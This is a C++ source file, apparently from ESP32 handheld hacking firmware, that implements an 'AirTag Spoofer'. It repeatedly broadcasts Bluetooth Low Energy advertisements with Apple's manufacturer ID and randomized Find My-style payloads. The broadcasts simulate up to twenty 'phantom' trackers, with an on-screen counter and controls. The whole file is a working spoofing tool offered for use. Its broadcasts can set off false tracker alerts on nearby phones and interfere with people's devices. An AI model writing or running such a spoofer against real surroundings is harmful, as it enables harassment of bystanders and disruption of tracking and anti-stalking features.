#if !defined(LITE_VERSION)
#include "airtag_spoofer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <globals.h>

static int spoofCount = 5;
static bool spoofRunning = false;

static void setAirTagPayload(NimBLEAdvertising *adv, int index) {
    uint8_t payload[27];
    payload[0] = 0x12;
    payload[1] = 0x19;
    payload[2] = 0x10;

    for (int i = 3; i < 27; i++) {
        payload[i] = random(256);
    }

    randomSeed(index * 12345 + 67890);
    for (int i = 3; i < 9; i++) {
        payload[i] = random(256);
    }
    randomSeed(micros());

    NimBLEAdvertisementData advData;

    std::string mfgData;
    mfgData += (char)0x4C;
    mfgData += (char)0x00;
    for (int i = 0; i < 27; i++) {
        mfgData += (char)payload[i];
    }
    advData.setManufacturerData(mfgData);

    adv->setAdvertisementData(advData);
}

void airtagSpoofer() {
    spoofRunning = true;
    int currentTag = 0;
    int totalBroadcasts = 0;

    NimBLEDevice::deinit(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    if (!NimBLEDevice::init("")) {
        displayError("BLE init failed", true);
        return;
    }
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    while (spoofRunning) {
        setAirTagPayload(pAdvertising, currentTag);

        pAdvertising->start();
        delay(100);
        pAdvertising->stop();

        totalBroadcasts++;
        currentTag = (currentTag + 1) % spoofCount;

        drawMainBorderWithTitle("AirTag Spoofer");
        int y = 45;
        int padX = 12;

        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(padX, y);
        tft.print("Status: BROADCASTING");
        y += 16;

        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setCursor(padX, y);
        tft.printf("Phantom Tags: %d", spoofCount);
        y += 14;

        tft.setCursor(padX, y);
        tft.printf("Current: Tag #%d", currentTag + 1);
        y += 14;

        tft.setCursor(padX, y);
        tft.printf("Broadcasts: %d", totalBroadcasts);
        y += 20;

        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(padX, y);
        tft.print("Up/Down: adjust count");
        y += 14;
        tft.setCursor(padX, y);
        tft.printf("Range: %d tags", spoofCount);

        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);

        if (check(EscPress)) {
            spoofRunning = false;
            break;
        }
        if (check(UpPress) || check(NextPress)) {
            spoofCount++;
            if (spoofCount > 20) spoofCount = 20;
        }
        if (check(DownPress) || check(PrevPress)) {
            spoofCount--;
            if (spoofCount < 1) spoofCount = 1;
        }

        esp_task_wdt_reset();
        delay(50);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}
#endif
